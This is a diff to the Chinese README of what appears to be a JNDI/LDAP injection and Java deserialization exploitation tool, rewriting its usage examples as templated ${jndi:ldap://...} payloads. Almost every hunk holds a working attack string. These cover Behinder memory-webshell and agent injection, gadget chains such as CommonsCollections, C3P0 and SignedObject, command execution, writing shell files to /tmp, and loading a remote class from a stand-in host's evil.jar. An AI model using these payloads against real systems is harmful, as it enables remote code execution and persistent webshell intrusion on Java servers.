@@ -106,21 +106,27 @@ Supported LADP Queries：
   不指定类型就默认为冰蝎马。
 
 ```
-ldap://0.0.0.0:1389/TomcatBypass/JBossServlet/urlr/urlls-bx-obscure
+{{url
+    (${jndi:ldap://0.0.0.0:1389/TomcatBypass/JBossServlet/urlr/urlls-bx-obscure)
+}}
 ```
 
 支持自定义路径：
 不指定时默认路径为nu1r，示例中的rlls就是重新指定的路径。
 
 ```
-ldap://0.0.0.0:1389/TomcatBypass/JBossServlet/urlr/rlls-bx-obscure
+{{url
+    (${jndi:ldap://0.0.0.0:1389/TomcatBypass/JBossServlet/urlr/rlls-bx-obscure)
+}}
 ```
 
 Agent写入：
 因为无Jar落地所以分`winAgent`与`linAgent`实现。
 
 ```
-ldap://0.0.0.0:1389/TomcatBypass/JBossServlet/urlr/rlls-bx-linAgent
+{{url
+    (${jndi:ldap://0.0.0.0:1389/TomcatBypass/JBossServlet/urlr/rlls-bx-linAgent)
+}}
 ```
 
 内存马说明：
@@ -159,26 +165,42 @@ ldap://0.0.0.0:1389/TomcatBypass/JBossServlet/urlr/rlls-bx-linAgent
 TS ：Thread Sleep - 通过 Thread.sleep() 的方式来检查是否存在反序列化漏洞，使用命令：TS-10
 
 ```
-ldap://0.0.0.0:1389/Deserialization/Clojure/nu1r/Base64/TS-10
+{{url
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/Clojure/nu1r/Base64/{{base64
+        (TS-10)
+    }}})
+}}
 ```
 
 RC ：Remote Call - 通过 URLClassLoader.loadClass()
 来调用远程恶意类并初始化，使用命令：RC-http://xxxx.com/evil.jar#EvilClass
 
 ```
-ldap://0.0.0.0:1389/Deserialization/Clojure/nu1r/Base64/RC-http://xxxx.com/evil.jar#EvilClass
+{{url
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/Clojure/nu1r/Base64/{{base64
+        (RC-http://xxxx.com/evil.jar#EvilClass)
+    }}})
+}}
 ```
 
 WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命令：WF-/tmp/shell#123
 
 ```
-ldap://0.0.0.0:1389/Deserialization/Clojure/nu1r/Base64/WF-/tmp/shell#123
+{{url
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/Clojure/nu1r/Base64/{{base64
+        (WF-/tmp/shell#123)
+    }}})
+}}
 ```
 
 其他：普通命令执行 - 通过 ProcessBuilder().start() 执行系统命令，使用命令 whoami
 
 ```
-ldap://0.0.0.0:1389/Deserialization/Clojure/nu1r/Base64/whoami
+{{url
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/Clojure/nu1r/Base64/{{base64
+        (whoami)
+    }}})
+}}
 ```
 
 ---
@@ -194,7 +216,11 @@ ldap://0.0.0.0:1389/Deserialization/Clojure/nu1r/Base64/whoami
     * C3P04 'c3p0Double-/usr/CC6.ser'
 
 ```
-ldap://0.0.0.0:1389/Deserialization/C3P04/nu1r/Base64/[base64_encoded_cmd]
+{{url
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/C3P04/nu1r/Base64/{{base64
+        ([base64_encoded_cmd])
+    }}})
+}}
 ```
 
 ---
@@ -220,28 +246,11 @@ ldap://0.0.0.0:1389/Deserialization/C3P04/nu1r/Base64/[base64_encoded_cmd]
 * SignedObjectPayload -> 'CC:CommonsCollections6:b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==:10000' 20000
 
 ```
-ldap://0.0.0.0:1389/Deserialization/SignedObject/nu1r/Base64/[base64_encoded_SignedObjectPayload]
-```
-
-* 使用Yakit简化其Payload
-
-热加载中加入以下方法
-
-```go
-jndiNuSig = func(Payload) {
-    c        := str.Split(Payload,"#")
-    c1       := codec.EncodeBase64(c[2])
-    Payload  := str.Replace(c[1],"arg2",c1,1)
-    c2       := codec.EncodeBase64(Payload)
-    Payload1 := str.Replace(c[0],"arg1",c2,1)
-    return codec.EncodeUrl(Payload1)
-}
-```
-
-使用时只需要更改你的<VPS_IP>与要执行的命令即可
-
-```
-{{yak(jndiNuSig|${jndi:ldap://0.0.0.0:1389/Deserialization/SignedObject/nu1r/Base64/arg1}#CC:CommonsCollections6:arg2:10000#open -a Calculator.app)}}
+{{url
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/SignedObject/nu1r/Base64/{{base64
+        (CC:CommonsCollections6:arg2:10000#open -a Calculator.app)
+    }}})
+}}
 ```
 
 效果图：
@@ -303,27 +312,13 @@ jndiNuSig = func(Payload) {
 | Vaadin1                                      | com.vaadin:vaadin-server:7.7.14<br/>com.vaadin:vaadin-shared:7.7.14                                                                                                                                                                                                        |         |
 
 * 使用示例：
-  ```
-  ldap://0.0.0.0:1389/Deserialization/[GadgetType]/nu1r/Base64/[base64_encoded_cmd]
-  ```
-* 使用Yakit方便修改的法子
-
-先于热加载标签中插入代码
-
-```go
-jndiNuSer = func(Payload) {
-    Command := str.Split(Payload,"#")
-    cmd     := codec.EncodeBase64(Command[1])
-    Payload := str.Replace(Command[0],"nu1rNew",cmd,1)
-    return codec.EncodeUrl(Payload)
-}
 ```
-
-之后只需要改 GadgetType ，与Command即可
-
-```
-{{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/Groovy1/nu1r/Base64/nu1rNew}#ping 123)}}
-```
+{{url
+  (${jndi:ldap://0.0.0.0:1389/Deserialization/[GadgetType]/nu1r/Base64/{{base64
+      (base64_encoded_cmd)
+  }}})
+}}
+ ```
 
 效果图：
 
@@ -346,58 +341,94 @@ jndiNuSer = func(Payload) {
 TS ：Thread Sleep - 通过 Thread.sleep() 的方式来检查是否存在反序列化漏洞，使用命令：TS-10
 
 ```
-{{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/nu1rNew}#TS-10)}}
+{{url
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+        (TS-10)
+    }}})
+}}
 ```
 
 RC ：Remote Call - 通过 URLClassLoader.loadClass()
 来调用远程恶意类并初始化，使用命令：RC-http://xxxx.com/evil.jar#EvilClass
 
 ```
-{{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/nu1rNew}#RC-http://xxxx.com/evil.jar#EvilClass)}}
+{{url
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+        (RC-http://xxxx.com/evil.jar#EvilClass)
+    }}})
+}}
 ```
 
 WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命令：WF-/tmp/shell#d2hvYW1p
 
 ```
-{{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/nu1rNew}#WF-/tmp/shell#d2hvYW1p)}}
+{{url
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+        (WF-/tmp/shell#d2hvYW1p)
+    }}})
+}}
 ```
 
 PB ：ProcessBuilder 通过 ProcessBuilder.start() 来执行系统命令，使用命令 ```PB-lin-d2hvYW1p``` / ```PB-win-d2hvYW1p```
 分别在不同操作系统执行命令
 
 ```
-{{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/nu1rNew}#PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==)}}
+{{url
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+        (PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==)
+    }}})
+}}
 ```
 
 SE ：ScriptEngine - 通过 ScriptEngineManager.getEngineByName('js').eval() 来解析 JS 代码调用 Runtime 执行命令，使用命令
 SE-d2hvYW1
 
 ```
-{{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/nu1rNew}#SE-d2hvYW1)}}
+{{url
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+        (SE-d2hvYW1)
+    }}})
+}}
 ```
 
 DL ：DNS LOG - 通过 InetAddress.getAllByName() 来触发 DNS 解析，使用命令 DL-xxxdnslog.cn
 
 ```
-{{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/nu1rNew}#DL-xxxdnslog.cn)}}
+{{url
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+        (DL-xxxdnslog.cn)
+    }}})
+}}
 ```
 
 HL ：HTTP LOG - 通过 URL.getContent() 来触发 HTTP LOG，使用命令 HL-http://xxx.com
 
 ```
-{{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/nu1rNew}#HL-http://xxx.com)}}
+{{url
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+        (HL-http://xxx.com)
+    }}})
+}}
 ```
 
 BC ：BCEL Classloader - 通过 ..bcel...ClassLoader.loadClass().newInstance() 来加载 BCEL 类字节码，使用命令 BC-$BCEL$xxx
 
 ```
-{{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/nu1rNew}#BC-$BCEL$xxx)}}
+{{url
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+        (BC-$BCEL$xxx)
+    }}})
+}}
 ```
 
 其他：普通命令执行 - 通过 Runtime.getRuntime().exec() 执行系统命令，使用命令 whoami
 
 ```
-{{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/nu1rNew}#whoami)}}
+{{url
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+        (whoami)
+    }}})
+}}
 ```
 
 ---
